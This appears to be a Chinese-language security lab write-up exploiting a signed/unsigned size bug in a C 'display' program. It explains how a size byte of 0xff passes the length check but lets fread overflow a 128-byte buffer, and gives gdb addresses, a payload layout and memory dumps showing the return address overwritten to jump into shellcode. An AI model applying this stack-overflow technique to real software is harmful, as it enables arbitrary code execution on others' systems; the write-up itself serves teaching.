## Main Idea

我们看看函数`display`完成了什么工作：首先读取文件的第一个字节，这个字节表示接下来要从文件中读取的字节数。接下来对刚刚读取的字节数进行检查，如果读取失败，或者读取的字节太多那么直接退出。最后，如果通过检查，那么就从文件中读取对应的字节数并输出至标准输出。

在程序`display`中，要读取的字节数`size`被定义为一个8位的有符号数，而函数`fread`中，形参`size`的类型为无符号数。如果我们输入`size`为-1，即`0xff`，它可以通过检查。但是它被传入`fread`后，就被解读为255，使得我们构造的payload足够写入缓冲区。

## Magic Numbers

与 Remus 类似，需要获取`buf`和`display`的返回地址：
```
(gdb) p &msg
$3 = (char (*)[128]) 0xffffd9c8
(gdb) i f
Stack level 0, frame at 0xffffda60:
 eip = 0x80491ee in display (telemetry.c:11); saved eip = 0x80492bd
 called by frame at 0xffffda90
 source language c.
 Arglist at 0xffffda58, args: path=0xffffdc23 "navigation"
 Locals at 0xffffda58, Previous frame's sp is 0xffffda60
 Saved registers:
  ebp at 0xffffda58, eip at 0xffffda5c
```

## Exploit Structure

根据获取的信息，很容易构造出payload：

1. 在文件头插入字节`\xff`。
2. 用字符覆盖从`buf`到`eip`之间的区域。
3. 覆盖旧的返回地址`eip`，由于我们直接把SHELLCODE放在`eip`后面，因此新的返回地址为`eip + 4`，即`0xffffda60`。
4. 最后，直接在`eip`之后插入SHELLCODE。

## Exploit GDB Output

进行爆破前：
```
(gdb) x/40x 0xffffd9c8
0xffffd9c8:     0x00000001      0x00000000      0x00000002      0x00000000
0xffffd9d8:     0x00000000      0x00000000      0x00000000      0x08048034
0xffffd9e8:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffd9f8:     0x00000000      0x0804904a      0x00000000      0x000003ea
0xffffda08:     0x000003ea      0x000003ea      0x000003ea      0xffffdbfb
0xffffda18:     0x178bfbff      0x00000064      0x00000000      0x00000000
0xffffda28:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffda38:     0x00000000      0xffffdbeb      0x00000002      0x00000000
0xffffda48:     0x00000000      0x00000000      0x00000000      0xffffdfe2
0xffffda58:     0xffffda78      0x080492bd      0xffffdc23      0x00000000
```

进行爆破后：
```
(gdb) x/40x &msg
0xffffd9c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd9d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd9e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd9f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda08:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda18:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda28:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda38:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda48:     0x000000d2      0x41414141      0x41414141      0x41414141
0xffffda58:     0x41414141      0xffffda60      0xcd58326a      0x89c38980
```